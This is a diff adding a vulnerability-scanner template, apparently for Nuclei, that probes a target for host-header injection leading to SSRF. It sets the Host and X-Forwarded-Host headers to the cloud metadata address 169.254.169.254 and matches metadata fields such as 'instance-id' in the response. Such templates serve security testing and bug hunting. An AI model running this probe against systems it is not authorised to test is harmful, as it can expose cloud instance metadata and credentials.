@@ -1,0 +1,26 @@
+id: m7-host-header-ssrf-chain
+info:
+  name: M7 - Host Header to SSRF Escalation
+  author: Sharlix
+  severity: critical
+  description: Host header injection escalated to SSRF via metadata endpoint
+  tags: host-header,ssrf,chain,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Host: "169.254.169.254"
+      X-Forwarded-Host: "169.254.169.254"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-ipv4"
+        part: body
+        condition: or
